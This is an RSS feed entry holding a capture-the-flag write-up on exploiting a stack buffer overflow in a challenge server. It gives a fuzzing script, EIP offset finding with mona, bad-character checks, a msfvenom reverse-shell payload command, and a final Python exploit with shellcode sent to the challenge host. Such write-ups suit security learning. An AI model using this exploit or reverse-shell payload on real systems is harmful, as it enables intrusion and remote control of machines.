<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>CyberTalents | Mohamed ELLEUCH</title>
    <link>https://mohamed-elleuch.me/tag/cybertalents/</link>
      <atom:link href="https://mohamed-elleuch.me/tag/cybertalents/index.xml" rel="self" type="application/rss+xml" />
    <description>CyberTalents</description>
    <generator>Wowchemy (https://wowchemy.com)</generator><language>en-us</language><copyright>Copyright Â© Mohamed Elleuch 2021</copyright><lastBuildDate>Mon, 19 Apr 2021 00:00:00 +0000</lastBuildDate>
    <image>
      <url>https://mohamed-elleuch.me/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_512x512_fill_lanczos_center_2.png</url>
      <title>CyberTalents</title>
      <link>https://mohamed-elleuch.me/tag/cybertalents/</link>
    </image>
    
    <item>
      <title>CyberTalents - Crashed Writeup</title>
      <link>https://mohamed-elleuch.me/writeups/ct-crashed/</link>
      <pubDate>Mon, 19 Apr 2021 00:00:00 +0000</pubDate>
      <guid>https://mohamed-elleuch.me/writeups/ct-crashed/</guid>
      <description>&lt;h1 id=&#34;p-stylecolorredinformation-gathering-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Information Gathering &lt;/p&gt;&lt;/h1&gt;
&lt;h2 id=&#34;p-stylecolorgreennmap-scan-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Nmap scan &lt;/p&gt;&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo nmap -sC -sV 3.121.99.159 -v
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           FileZilla ftpd
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2019 Datacenter 17763 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: EC2AMAZ-HF7234C
|   NetBIOS_Domain_Name: EC2AMAZ-HF7234C
|   NetBIOS_Computer_Name: EC2AMAZ-HF7234C
|   DNS_Domain_Name: EC2AMAZ-HF7234C
|   DNS_Computer_Name: EC2AMAZ-HF7234C
|   Product_Version: 10.0.17763
|_  System_Time: 2021-04-19T19:39:58+00:00
| ssl-cert: Subject: commonName=EC2AMAZ-HF7234C
| Issuer: commonName=EC2AMAZ-HF7234C
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-02-20T08:01:53
| Not valid after:  2021-08-22T08:01:53
| MD5:   7635 3668 55ed 74c9 448a cee5 b46a afa4
|_SHA-1: 0b57 e7e8 e874 1e70 2779 e4c1 3dc0 afca 13bb 8f70
|_ssl-date: 2021-04-19T19:40:07+00:00; -17s from scanner time.
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -16s, deviation: 2s, median: -17s
| smb-os-discovery: 
|   OS: Windows Server 2019 Datacenter 17763 (Windows Server 2019 Datacenter 6.3)
|   Computer name: EC2AMAZ-HF7234C
|   NetBIOS computer name: EC2AMAZ-HF7234C\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-04-19T19:40:02+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-04-19T19:40:01
|_  start_date: N/A


&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;p-stylecolorgreensmb-enum-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;SMB Enum &lt;/p&gt;&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;smbmap -u guest -H 3.121.99.159
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;em&gt;vulnserver-master&lt;/em&gt; seems interesting, let&amp;rsquo;s take a look at it
&lt;img src=&#34;smbmap.png&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;smbclient //3.121.99.159/vulnserver-master -U guest -p
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;smbclient.png&#34;&gt;
&lt;p&gt;Let&amp;rsquo;s download these 2 files&lt;/p&gt;
&lt;img src=&#34;dw.png&#34;&gt;
&lt;h2 id=&#34;p-stylecolorgreensuper-secure-serverp&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Super Secure Server&lt;/p&gt;&lt;/h2&gt;
&lt;p&gt;So basically from the name of the box,finding an executable and also the &lt;em&gt;essfunc.dll&lt;/em&gt; which comes with the vulnserver, we can presume we&amp;rsquo;re going to deal with a vulnerability!&lt;/p&gt;
&lt;p&gt;We&amp;rsquo;re still missing something, on which port is this service is running?&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s run a full port nmap scan again&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo nmap -T4 -p- 3.121.99.159 -v
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;Discovered open port 21/tcp on 3.121.99.159
Discovered open port 3389/tcp on 3.121.99.159
Discovered open port 139/tcp on 3.121.99.159
Discovered open port 445/tcp on 3.121.99.159
Discovered open port 135/tcp on 3.121.99.159
Discovered open port 5985/tcp on 3.121.99.1594
Discovered open port *1887*/tcp on 3.121.99.159
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Let&amp;rsquo;s try if any of the new ports gets anything, seems like 1887 is the one we&amp;rsquo;re looking for&lt;/p&gt;
&lt;img src=&#34;super.png&#34;&gt;
&lt;p&gt;Now we&amp;rsquo;ll have to find the vulnerable command&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s play around the executable file that we got&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;strings super_secure_server.exe
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Scrolling a bit we can find something interesting&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;...snip...

Received a client connection from %s:%u
Usage: %s [port_number]
If no port number is provided, the default port of %s will be used.
Welcome to the super secure server! Enter HELP for help
Send failed with error: %d
HELP 
HELP
SECRET
Mission Completed
EXIT
GOODBYE
Connection closing...
UNKNOWN COMMAND

...snip...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;em&gt;SECRET&lt;/em&gt; is the command that we&amp;rsquo;re looking for&lt;/p&gt;
&lt;h1 id=&#34;p-stylecolorredpreparing-the-debuggerp&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Preparing the debugger&lt;/p&gt;&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;I&amp;rsquo;ll be using Immunity debbuger &amp;amp; mona for this
&lt;a href=&#34;https://www.immunityinc.com/products/debugger/&#34;&gt;https://www.immunityinc.com/products/debugger/&lt;/a&gt;
&lt;a href=&#34;https://github.com/corelan/mona&#34;&gt;https://github.com/corelan/mona&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;After opening the executeable with the debbuger
we first we&amp;rsquo;re gonna set a working directory for mona at the buttom of the debbuger window&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mona&#34;&gt;!mona config -set workingfolder c:\mona\%p
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;It should look like this&lt;/p&gt;
&lt;img src=&#34;start.png&#34;&gt;
&lt;p&gt;Reading through the assembly code we can see something interesting&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;; |ASCII &amp;quot;13337&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Which means this is the default port that the app will work on&lt;/p&gt;
&lt;img src=&#34;vuln.png&#34;&gt;
&lt;p&gt;And yeah! It works&lt;/p&gt;
&lt;p&gt;Now let&amp;rsquo;s start the fun stuff!&lt;/p&gt;
&lt;h1 id=&#34;p-stylecolorredfuzzing-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Fuzzing &lt;/p&gt;&lt;/h1&gt;
&lt;p&gt;So now basically we&amp;rsquo;re going to send the server with a string that has an increasing length until it crashs!&lt;/p&gt;
&lt;p&gt;We&amp;rsquo;ll be using this python script to make life easier&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python3

import socket, time, sys

ip = &amp;quot;192.168.1.14&amp;quot;

port = 13337
timeout = 5
prefix = &amp;quot;SECRET &amp;quot;

string = prefix + &amp;quot;A&amp;quot; * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print(&amp;quot;Fuzzing with {} bytes&amp;quot;.format(len(string) - len(prefix)))
      s.send(bytes(string, &amp;quot;latin-1&amp;quot;))
      s.recv(1024)
  except:
    print(&amp;quot;Fuzzing crashed at {} bytes&amp;quot;.format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * &amp;quot;A&amp;quot;
  time.sleep(1)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We run the script and wait until it crashes&lt;/p&gt;
&lt;img src=&#34;crashed.png&#34;&gt;
&lt;h1 id=&#34;p-stylecolorredcontrolling-eip-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Controlling EIP &lt;/p&gt;&lt;/h1&gt;
&lt;p&gt;The server crashed after sending 1000 bytes! Let&amp;rsquo;s generate a pattern with metasploit&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;For good practice, we should choose a longer pattern ( More than 1000 bytes )&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;/opt/metasploit/tools/exploit/pattern_create.rb -l 1300
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;pattern.png&#34;&gt;
&lt;p&gt;Let&amp;rsquo;s send it again to the server&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python3

import socket

ip = &amp;quot;192.168.1.14&amp;quot;
port = 13337

prefix = &amp;quot;SECRET &amp;quot;
offset = 0

payload = &amp;quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2B&amp;quot;


bufferx = prefix + payload 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print(&amp;quot;Sending...&amp;quot;)
  s.recv(1024)
  s.send(bytes(bufferx ,&amp;quot;latin-1&amp;quot;))
  print(&amp;quot;Done!&amp;quot;)
except:
  print(&amp;quot;Could not connect.&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Once we send it, the server should be crashed!&lt;/p&gt;
&lt;p&gt;Now let&amp;rsquo;s find where exactly it got crashed!&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mona&#34;&gt;!mona findmsp -distance 1300
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now Mona should display a log window&lt;/p&gt;
&lt;img src=&#34;log.png&#34;&gt;
&lt;p&gt;We&amp;rsquo;re interested in the EIP register&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;...snip...

EIP contains normal pattern : 0x68423268 (offset 997)

...snip...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Our offset=997&lt;/p&gt;
&lt;h1 id=&#34;p-stylecolorredfinding-bad-characters-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Finding Bad Characters &lt;/p&gt;&lt;/h1&gt;
&lt;p&gt;First, let&amp;rsquo;s create a bytearray with mona&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mona&#34;&gt;!mona bytearray -b &amp;quot;\x00&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The output should be saved at c:\mona\super_secure_server\bytearray.bin&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;\x00 is by default a bad characters, so we get rid of it from the beginning&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Let&amp;rsquo;s now generate our payload array&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;for x in range(1, 256):
  print(&amp;quot;\\x&amp;quot; + &amp;quot;{:02x}&amp;quot;.format(x), end=&#39;&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now let&amp;rsquo;s send again our payload containing all the bad characters&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python3

import socket

ip = &amp;quot;192.168.1.14&amp;quot;
port = 13337

prefix = &amp;quot;SECRET &amp;quot;
offset = 997
overflow = &amp;quot;A&amp;quot; * offset
RETURN = &amp;quot;CCCC&amp;quot;
padding = &amp;quot;&amp;quot;
payload = &amp;quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&amp;quot;
postfix = &amp;quot;&amp;quot;

bufferx = prefix + overflow + RETURN + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print(&amp;quot;Sending evil buffer...&amp;quot;)
  s.recv(1024)
  s.send(bytes(bufferx ,&amp;quot;latin-1&amp;quot;))
  print(&amp;quot;Done!&amp;quot;)
except:
  print(&amp;quot;Could not connect.&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now let&amp;rsquo;s compare the data that the ESP points to and the bytearray&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mona&#34;&gt;!mona compare -f c:\mona\super_secure_server\bytearray.bin -a &amp;lt;ESP_addr&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;bad1.png&#34;&gt;
&lt;img src=&#34;bad2.png&#34;&gt;
We&#39;re a bit lucky here, there is no bad characters rather than the nullbyte!
But in most cases we&#39;re gonna get them!
To re-do the steps before with removing the bad character that we find!
&lt;blockquote&gt;
&lt;p&gt;PS: When you find 2/3 consecutive bad characters, just start by removing the first one. The bytes next to it may got overflowed ( anything can happen..)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;p-stylecolorredfinding-a-jump-point-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Finding a Jump Point &lt;/p&gt;&lt;/h1&gt;
&lt;p&gt;In our case only the nullbyte is a bad character&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mona&#34;&gt;!mona jmp -r esp -cpb &amp;quot;\x00&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;jump.png&#34;&gt;
&lt;p&gt;We can use anyone of these. We&amp;rsquo;ll be using it for the RETURN variable ( Little indian format)&lt;/p&gt;
&lt;h1 id=&#34;p-stylecolorredgenerate-payload-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Generate Payload &lt;/p&gt;&lt;/h1&gt;
&lt;p&gt;We&amp;rsquo;ll use msfvenom to generate it&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;/opt/metasploit/msfvenom -p windows/shell_reverse_tcp LHOST=&amp;lt;ip&amp;gt; LPORT=&amp;lt;port&amp;gt; EXITFUNC=thread -b &amp;quot;\x00&amp;quot; -f py
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;p-stylecolorredprepend-nops-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Prepend NOPs &lt;/p&gt;&lt;/h1&gt;
&lt;p&gt;We used an encoder to generate the payload, so a space in memory is needed for the payload to unpack!&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;padding = &amp;quot;\x90&amp;quot; * 16
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;p-stylecolorredfinal-exploit-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Final Exploit &lt;/p&gt;&lt;/h1&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python3

import socket

ip = &amp;quot;3.121.99.159&amp;quot;
port = 1887

prefix = &amp;quot;SECRET &amp;quot;
offset = 997
overflow = &amp;quot;A&amp;quot; * offset
retn = &amp;quot;\xa0\x12\x50\x62&amp;quot; 
padding = &amp;quot;\x90&amp;quot; * 16 
payload=&amp;quot;&amp;quot;
payload+=&amp;quot;\xdb\xd9\xb8\xae\xcc\x38\xcf\xd9\x74\x24\xf4\x5a\x29\xc9\xb1&amp;quot;
payload+=&amp;quot;\x52\x31\x42\x17\x83\xc2\x04\x03\xec\xdf\xda\x3a\x0c\x37\x98&amp;quot;
payload+=&amp;quot;\xc5\xec\xc8\xfd\x4c\x09\xf9\x3d\x2a\x5a\xaa\x8d\x38\x0e\x47&amp;quot;
--snip--
payload+=&amp;quot;\x24\xe8\xaa\x68\xff\xa8\xcb\x8a\xd5\xc4\x63\x13\xbc\x64\xee&amp;quot;
payload+=&amp;quot;\xa4\x6b\xaa\x17\x27\x99\x53\xec\x37\xe8\x56\xa8\xff\x01\x2b&amp;quot;
payload+=&amp;quot;\xa1\x95\x25\x98\xc2\xbf&amp;quot;
postfix = &amp;quot;&amp;quot;

bufferx = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print(&amp;quot;Sending evil buffer...&amp;quot;)
  s.recv(1024)
  s.send(bytes(bufferx ,&amp;quot;latin-1&amp;quot;))
  print(&amp;quot;Done!&amp;quot;)
except:
  print(&amp;quot;Could not connect.&amp;quot;)

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We set our listener and get shell on the box&lt;/p&gt;
&lt;img src=&#34;proof1.png&#34;&gt;
And grab the flag
&lt;img src=&#34;proof2.png&#34;&gt;
&lt;h2 id=&#34;thanks-for-reading-hope-you-enjoyed-it&#34;&gt;Thanks for reading hope you enjoyed it!&lt;/h2&gt;
</description>
    </item>
    
  </channel>
</rss>
